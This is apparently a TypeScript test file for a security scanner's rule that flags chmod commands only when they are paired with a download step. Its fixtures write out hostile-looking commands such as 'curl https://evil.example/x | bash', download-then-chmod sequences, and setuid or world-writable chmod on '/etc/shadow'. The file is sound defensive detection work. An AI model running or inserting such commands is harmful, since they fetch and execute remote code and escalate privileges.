/**
 * SMI-5424 PR2: chmod FP-narrowing via a compound (download-then-chmod) signal.
 *
 * Owner-perm chmod (755/644/600/700/+x) previously false-fired
 * privilege_escalation:critical on benign idioms (`chmod 755 ./bin/cli`,
 * `chmod 600 .env`). It now fires only when a real fetch COMMAND is within ±1 line
 * (FIX-1: curl/wget/git-clone/npx-to-URL — not bare prose tokens) OR the chmod
 * targets the download DESTINATION of a fetch command anywhere in the content
 * (FIX-2: anchored on `-o`/`-O`/`--output`/`>`, NOT basename-anywhere, so a URL
 * path/query/header value does not false-correlate). World-writable / setuid chmod
 * stay standalone-critical. Critically, the download-then-chmod co-signal that
 * escalates code_execution to CRITICAL is PRESERVED (escalateCodeExecution needs a
 * high/critical co-signal, so chmod could not simply be downgraded).
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const pe = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'privilege_escalation')

describe('SMI-5424 chmod compound-signal', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // Standalone-critical: genuine privilege threats fire on their own.
  it.each([
    ['world-writable 777', 'chmod 777 /usr/local/bin/x'],
    ['world-writable 666', 'chmod 666 /etc/shadow'],
    ['world-writable 757', 'chmod 757 file'],
    ['setuid 4755', 'chmod 4755 ./run'],
    ['setuid leading-zero 04755', 'chmod 04755 ./run'],
    ['setgid 2755', 'chmod 2755 ./run'],
    ['symbolic u+s', 'chmod u+s ./payload'],
    ['symbolic g+s', 'chmod g+s ./payload'],
  ])('fires standalone-critical: %s', (_label, content) => {
    const f = pe(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('critical')
  })

  // FP fixed: owner-perm chmod with NO fetch verb does not fire.
  it.each([
    ['chmod 755 cli', 'chmod 755 ./bin/cli'],
    ['chmod 600 .env', 'chmod 600 .env'],
    ['chmod 644 file', 'chmod 644 config.yaml'],
    ['chmod 700 dir', 'chmod 700 ~/.config/app'],
    ['chmod 400 key', 'chmod 400 id_rsa'],
    ['chmod +x build', 'chmod +x build.sh'],
  ])('does NOT fire standalone (FP fixed): %s', (_label, content) => {
    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // Compound: owner-perm chmod co-located with a fetch verb fires HIGH.
  it('fires HIGH when co-located with a fetch verb (same line)', () => {
    const f = pe(
      scanner.scan('t', 'curl https://evil.example/p -o /tmp/p && chmod 755 /tmp/p').findings
    )
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })
  it('fires HIGH when the fetch verb is on the adjacent line', () => {
    const f = pe(scanner.scan('t', 'wget http://1.2.3.4/p\nchmod +x /tmp/p').findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })

  // The BLOCKER-1 crux: curl|bash + chmod must STILL quarantine (chmod is the
  // co-signal that escalates code_execution to critical).
  it('preserves the download+chmod co-signal: curl|bash + chmod 755 quarantines', () => {
    const report = scanner.scan('t', 'curl https://evil.example/x | bash\nchmod 755 /tmp/p')
    const ce = report.findings.find((f) => f.type === 'code_execution')
    expect(ce?.severity).toBe('critical')
    expect(report.passed).toBe(false)
    expect(report.riskScore).toBeGreaterThanOrEqual(40)
  })

  // Doc-context: a fenced/quoted compound chmod stays sub-threshold.
  it('downgrades a fenced (doc) compound chmod to low', () => {
    const f = pe(
      scanner.scan('t', '```sh\ncurl https://x.example/p && chmod 755 /tmp/p\n```').findings
    )
    // either no finding or a low one — never high/critical from a doc block
    expect(f.every((x) => x.severity === 'low')).toBe(true)
  })

  // FIX-1 (SMI-5424 PR2): weak prose tokens (downloaded / bare URL / bare npx) next to
  // an owner-perm chmod no longer fire — CHMOD_FETCH_CONTEXT now matches only real
  // fetch commands (curl/wget/git-clone/npx-to-URL).
  it.each([
    ['# downloaded prose + chmod', '# After the file is downloaded\nchmod 755 ./bin/cli'],
    ['bare URL prose + chmod', 'See https://example.com/docs\nchmod 644 x'],
    ['bare npx + chmod', 'npx tool init\nchmod 755 x'],
  ])('does NOT fire on weak prose tokens (FIX-1): %s', (_label, content) => {
    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // FIX-2 (SMI-5424 PR2): filename-correlation catches a download-then-chmod even when
  // filler lines push the two outside the ±1 adjacency window.
  it('fires HIGH on a spaced download→chmod correlated by filename', () => {
    const content =
      'curl -o /tmp/payload https://evil.example/payload\necho a\necho b\nchmod 755 /tmp/payload'
    const f = pe(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })

  it('fires HIGH on a spaced curl -O URL→chmod (destination = URL basename)', () => {
    // `curl -O https://evil/payload` writes to `payload`; the spaced `chmod 755 payload`
    // correlates on the destination basename via the optional leading-path branch.
    const content = 'curl -O https://evil.example/payload\necho a\necho b\nchmod 755 payload'
    const f = pe(scanner.scan('t', content).findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('high')
  })

  it('does NOT fire when the chmod target basename mismatches the fetched file', () => {
    // `config` (chmod) vs `config.json` (curl) — the trailing-`.` boundary blocks the
    // partial match, and curl is non-adjacent so the ±1 window does not fire either.
    const content = 'curl x -o config.json\necho a\necho b\nchmod 755 config'
    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // FIX-2 governance re-review (SMI-5424 PR2): correlation is anchored on the download
  // DESTINATION (`-o`/`-O`/`--output`/`>`), NOT "basename anywhere in a fetch line".
  // A basename that appears only in a URL path / query value / header value of a
  // (non-adjacent) fetch command must NOT correlate — these all fired HIGH under the
  // over-broad boundary and are the FP class this anchor closes.
  it.each([
    ['URL path segment', 'curl https://ci.example.com/build\necho a\necho b\nchmod 755 build'],
    ['URL query value', 'curl https://x.com/d?file=build\necho a\necho b\nchmod 755 build'],
    ['request header value', 'curl -H "x: app" https://x.com\necho a\necho b\nchmod 755 app'],
    [
      'registry URL basename',
      'curl https://registry.npmjs.org/cli\necho a\necho b\nchmod +x ./bin/cli',
    ],
  ])(
    'does NOT correlate a basename that is not the download destination: %s',
    (_label, content) => {
      expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
    }
  )

  // Accepted residual, pinned so it stays intentional (not a silent gap): a SPACED
  // `curl … | bash` (pipe-to-interpreter, no downloaded filename) followed by a
  // NON-adjacent chmod is NOT caught by this helper — there is no filename to
  // correlate, and the remote-exec (code_execution) signal is the appropriate detector
  // for that shape.
  it('does NOT fire on a spaced curl|bash + non-adjacent chmod (documented residual)', () => {
    const content = 'curl https://evil.example/x | bash\necho a\necho b\nchmod 755 /tmp/p'
    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
  })
})
